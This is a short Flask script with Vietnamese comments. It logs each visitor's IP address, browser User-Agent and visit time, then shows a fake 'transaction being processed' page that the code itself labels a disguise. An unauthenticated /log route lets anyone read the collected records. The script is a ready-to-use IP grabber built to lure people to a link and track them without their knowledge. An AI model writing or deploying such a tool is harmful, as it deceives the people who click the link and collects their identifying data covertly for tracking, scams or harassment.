from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    # Lấy IP thật từ X-Forwarded-For (dành cho reverse proxy)
    forwarded_for = request.headers.get('X-Forwarded-For', '')
    ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr

    # Lấy User-Agent
    ua = request.headers.get('User-Agent', 'Unknown')

    # Ghi thời gian hiện tại
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Ghi log IP + thiết bị + thời gian
    log = f"{now} | IP: {ip} | Agent: {ua}\n"

    try:
        with open("ip_log.txt", "a", encoding="utf-8") as f:
            f.write(log)
    except Exception as e:
        return f"Log ghi thất bại: {e}"

    # Trả về nội dung ngụy trang
    return '''
    <html>
      <head><title>Đang xử lý giao dịch</title></head>
      <body style="font-family:sans-serif;text-align:center;margin-top:100px;">
        <h2>🔄 Giao dịch đang được xử lý...</h2>
        <p>Vui lòng không thoát trình duyệt trong khi hệ thống xác minh.</p>
      </body>
    </html>
    '''

@app.route('/log')
def view_log():
    try:
        with open("ip_log.txt", "r", encoding="utf-8") as f:
            return f"<pre>{f.read()}</pre>"
    except FileNotFoundError:
        return "❌ Chưa có dữ liệu IP truy cập."
    except Exception as e:
        return f"Lỗi khi đọc log: {e}"
